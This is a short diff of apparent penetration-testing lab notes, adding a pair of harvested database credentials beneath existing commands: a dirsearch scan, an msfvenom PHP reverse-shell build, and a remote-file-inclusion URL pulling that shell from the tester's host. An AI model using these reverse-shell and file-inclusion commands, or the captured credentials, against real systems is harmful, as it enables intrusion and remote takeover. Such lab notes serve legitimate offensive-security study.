@@ -155,6 +155,11 @@ dirsearch -u http://192.168.230.58 -w /usr/share/seclists/Discovery/Web-Content/
 https://www.exploit-db.com/exploits/48424
 msfvenom -p php/reverse_php LHOST=192.168.45.185 LPORT=8888 -f raw -o php_reverse_9999.pHP
 http://192.168.207.58/image.php?img=http://192.168.45.185/php_reverse_8888.pHP
+
+
+define('DBUSER', 'root');
+define('DBPASS', 'MalapropDoffUtilize1337');
+
 ```
 ### Bratarina
 ```shell
